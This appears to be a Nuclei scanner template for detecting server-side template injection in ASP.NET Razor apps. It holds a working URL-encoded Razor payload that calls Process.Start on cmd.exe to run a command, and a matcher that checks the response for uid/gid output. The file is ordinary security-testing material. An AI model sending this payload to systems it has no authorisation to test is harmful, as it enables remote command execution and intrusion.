http:
- fuzzing:
  - fuzz:
    - '{{injection}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: body
    regex:
    - uid=[0-9]+.*gid=[0-9]+.*
    type: regex
  payloads:
    injection:
    - '@{string+x%3Dnull%3Bint[]l%3D{105%2C100}%3Bforeach(int+c+in+l){x%2B%3D((char)c).ToString()%3B}%3B}@System.Diagnostics.Process.Start(%22cmd.exe%22%2C+%22/c+%22+x)'
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
id: razor-ssti
info:
  author: ritikchaddha
  description: 'Razor is a server-side templating engine for ASP.NET Core, it is a
    powerful template engine that can run pure C# code. It allows for server-side
    template injection by exploiting the Razor syntax.

    '
  metadata:
    max-request: 1
  name: Razor - Server Side Template Injection
  reference:
  - https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
  severity: high
  tags: razor,ssti,dast,vuln
